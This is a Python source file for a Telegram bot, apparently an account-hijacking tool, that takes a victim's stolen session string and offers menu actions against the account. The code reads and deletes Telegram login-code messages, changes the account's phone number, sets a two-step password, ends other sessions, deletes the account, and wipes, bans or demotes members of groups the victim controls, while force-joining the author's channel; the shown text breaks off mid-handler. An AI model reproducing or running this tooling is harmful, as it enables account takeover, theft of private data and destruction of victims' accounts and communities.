
# COPYRIGHT ¬© 2022 BY BABLOO/@DEV_BABLOO üî•
# NOW PUBLIC BY BABLOO
import os
os.system("pip install -U telethon")
from telethon import TelegramClient, events, functions, types, Button
from datetime import timedelta
import asyncio

api_id = os.environ.get("APP_ID")
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('Arabihack', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

Arabihack = 5341342370

Bot_Username =os.environ.get("BOT_USERNAME", None) or "SESSION_H_A_K_BOT"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await bot(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await bot(leave("@TELETHON"))
    except BaseException:
      pass
    try:
      await bot(leave("@TELETHON"))
    except BaseException:
      pass
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await bot(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await bot(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await bot(leave("@Ids_Holder"))
    except BaseException:
      pass
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianSupportGroup"))
    except BaseException:
      pass
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_2fa('IndianHack IS BEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(join("@BA_BLOO"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ‚ú∞Ô∏é {x.title} CHANNEL USRNAME ‚ú∞Ô∏é @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "BA_BLOO"
menu = '''

"A" :‚ú∞Ô∏é [ŸÖÿπÿ±ŸÅŸá ŸÇŸÜŸàÿßÿ™/ÿ¨ÿ±Ÿàÿ®ÿßÿ™ ÿßŸÑÿ™Ÿä ŸäŸÖŸÑŸÉŸáÿß]

"B" :‚ú∞Ô∏é [ÿ¨ŸÑÿ® ÿ¨ŸÖŸäÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÖÿ´ŸÑ {ÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿå ŸÖÿπÿ±ŸÅ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ Ÿà ÿßŸäÿØŸä ÿßŸÑÿ¥ÿÆÿµ... ]

"C" :‚ú∞Ô∏é [{ÿ™ŸÅŸÑŸäÿ¥ ÿ¨ÿ±Ÿàÿ®/ŸÇŸÜÿßŸá {ÿßÿπÿ∑ŸÜŸä ÿßŸÑŸÉŸàÿØ Ÿà ÿ®ÿπÿØŸáÿß ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸäŸàÿ≤ÿ± ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá Ÿà ÿ≥ÿßÿ∑ÿ±ÿØ ÿ¨ŸÖŸäÿπ ÿßÿπÿ∂ÿßÿ°]

"D" :‚ú∞Ô∏é [ÿ¨ŸÑÿ® ÿßÿÆÿ± ÿ±ÿ≥ÿßŸÑŸá ÿ™ÿ≠ÿ™ŸàŸä ÿπŸÑŸâ ŸÉŸàÿØ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿØÿÆŸàŸÑ ÿßŸÑŸâ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿπŸÜ ÿ∑ÿ±ŸäŸÇ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]

"E" :‚ú∞Ô∏é [ÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿ¨ÿ±Ÿàÿ®/ŸÇŸÜÿßŸá ÿπŸÜ ÿ∑ÿ±ŸäŸÇ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥] 

"F" :‚ú∞Ô∏é [ŸÖÿ∫ÿßÿØÿ±Ÿá ÿ¨ÿ±Ÿàÿ® /ŸÇŸÜÿßŸá ÿπŸÜ ÿ∑ÿ±ŸäŸÇ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]

"G" :‚ú∞Ô∏é [ŸÖÿ≥ÿ≠ ÿ¨ÿ±Ÿàÿ® /ŸÇŸÜÿßŸá ÿπŸÜ ÿπŸÜ ÿ∑ÿ±ŸäŸÇ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]

"H" :‚ú∞Ô∏é [ÿ™ÿßŸÉÿØ ŸÖŸÜ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ /ŸÖŸÅÿπŸÑ ÿßŸà ŸÑÿß]

"I" :‚ú∞Ô∏é [ÿßŸÜŸáÿßÿ° ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸÑÿ≥ÿßÿ™ ŸÖÿß ÿπÿØÿß ÿ¨ŸÑÿ≥ÿ© ÿßŸÑÿ®Ÿàÿ™]

"J" :‚ú∞Ô∏é [ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿπŸÜ ÿ∑ÿ±ŸäŸÇ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]

"K" :‚ú∞Ô∏é [ÿ™ÿ±ŸÇŸäŸá ÿπÿ∂Ÿà ÿßŸÑŸâ ŸÖÿ¥ÿ±ŸÅ ÿ®ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿ®ÿßŸÑŸÇŸÜÿßŸá]

"L" :‚ú∞Ô∏é [ÿ≠ÿ∞ŸÅ ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¥ÿ±ŸÅŸäŸÜ ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá]

"M" :‚ú∞Ô∏é [ÿ™ÿ∫Ÿäÿ± ÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]

"N" :‚ú∞Ô∏é [ŸÑÿßÿ±ÿ≥ÿßŸÑ ÿ±ÿ≥ÿßŸÑŸá ÿØÿßÿÆŸÑ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿπŸÜ ÿ∑ÿ±ŸäŸÇ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥] 

ÿßŸÜÿ™ÿ∏ÿ±Ÿà ŸÖŸÖŸäÿ≤ÿßÿ™ ÿßŸÉÿ´ÿ± ŸÇÿ±Ÿäÿ®ÿß ŸÖÿ∑Ÿàÿ± ÿßŸÑÿ®Ÿàÿ™ DEV_BABLOO.t.me
'''
mm = '''
ŸÖŸÑÿßÿ≠ÿ∏Ÿá ÿßŸÜÿ∂ŸÖ ÿßŸàŸÑÿß ŸÑŸÑÿØÿπŸÖ @BA_BLOO
'''

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J"),
    ],
  [
    Button.inline("K", data="K"), 
    Button.inline("L", data="L"),
    Button.inline("M", data="M"),
    Button.inline("N", data="N"),
    ],
  [
    Button.url("‡ºóìåπìè∫ ùñ•ùóàùóã ·Ç¶·•≤Ô∏è·Ç¶·•£·•Ü·•Ü . üí∏ Àº ìå∫", "https://t.me/DEV_BABLOO")
    ]
]

@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    IndianHack = [
      [
        Button.url("ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß", f"https://t.me/{Bot_Username}?start=hack")
        ]
      ]         
    await event.reply("ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸä", buttons=Arabihack)
  else:
    legendbye = [
      [
        Button.url("‚û™Ô∏éùêíùêéùêîùêëùêÇùêÑ ùêÅùêÄùêÅùë≥ùêéùêé‚öô", f"https://t.me/BA_BLOO")
        ]
      ]
    await event.reply("‚ú∞ ÿßŸàŸÑÿß ÿßŸÜÿ∂ŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜÿßŸá!\n‚ú∞ ÿ®ÿπÿØŸáÿß ÿ¨ÿ±ÿ® ÿ™ÿ±ÿ≥ŸÑ /hack", buttons=legendbye)
    


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  IndianHack = [
    [
      Button.url("ÿØŸàÿ≥ ŸáŸÜÿß", f"https://t.me/{Bot_Username}")
      ]
    ]         
  await event.reply("ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸä", buttons=Arabihack)
  
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
        ],
      [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
        ],
      [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M"),
        Button.inline("N", data="N"),
        ],
      [
        Button.url("‡ºóìåπìè∫ ùñ•ùóàùóã ·Ç¶·•≤Ô∏è·Ç¶·•£·•Ü·•Ü . üí∏ Àº ìå∫", "https://t.me/DEV_BABLOO")
        ]
    ]
    await x.send_message(f"ÿßÿÆÿ™ÿ± ŸÖÿß ÿ™ÿ±ŸäÿØ ŸÅÿπŸÑŸá ŸÖÿπŸá ÿßŸÑÿ¨ŸÑÿ≥Ÿá \n\n{menu}", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @DEV_BABLOO")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nÿ¥ŸÉÿ±ÿß ŸÑŸÉ ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿ®Ÿàÿ™. \n/hack", buttons=keyboard)
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nÿ¥ŸÉÿ±ÿß ŸÑŸÉ ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿ®Ÿàÿ™.\n/hack", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ®.\n/hack", buttons=keyboard)
    await x.send_message("ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÖÿπÿ±ŸÅ/ÿßŸäÿØŸä ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("Ÿäÿ™ŸÖ ÿ≠ÿ∏ÿ± ÿ¨ŸÖŸäÿπ ÿßÿπÿ∂ÿßÿ° ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nÿ¥ŸÉÿ±ÿß ŸÑŸÉ ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿ®Ÿàÿ™.\n/hack", buttons=keyboard)
    
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
    await x.send_message("ÿßÿπÿ∑ŸÜŸä ŸÖÿπÿ±ŸÅ/ÿßŸäÿØŸä ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
    await x.send_message("ÿßÿπÿ∑ŸÜŸä ŸÖÿπÿ±ŸÅ/ÿßŸäÿØŸä ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("ŸÑŸÇÿØ ÿ™ŸÖ ŸÖÿ∫ÿßÿØÿ±Ÿá ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá,\n/hack", buttons=keyboard)
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      await x.send_message("ÿßÿπÿ∑ŸÜŸä ŸÖÿπÿ±ŸÅ/ÿßŸäÿØŸä ÿ¨ÿ±Ÿàÿ®/ŸÇŸÜÿßŸá")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ¨ÿ±Ÿàÿ®/ŸÇŸÜÿßŸá //ÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿ®Ÿàÿ™.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("ÿßŸÑÿ¥ÿÆÿµ ŸÑŸÖ ŸäŸÅÿπŸÑ ÿ™ÿ≠ŸÇŸÇ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ ŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑŸâ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ®ŸÉŸÑ ÿ≥ŸáŸàŸÑŸá ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿßŸÖÿ± ( D ) \n\nÿ¥ŸÉÿ±ÿß ŸÑŸÉ ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿ®Ÿàÿ™.\n/hack", buttons=keyboard)
      else:
        await event.reply("ÿπÿ∞ÿ±ÿß ÿßŸÑÿ¥ÿÆÿµ ŸÖŸÅÿπŸÑ ÿ™ÿ≠ŸÇŸÇ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("ÿ™ŸÖ ÿßŸÜŸáÿßÿ° ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸÑÿ≥ÿßÿ™ ÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿ®Ÿàÿ™.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("ŸÑŸÇÿØ ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ®ŸÜÿ¨ÿßÿ≠.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
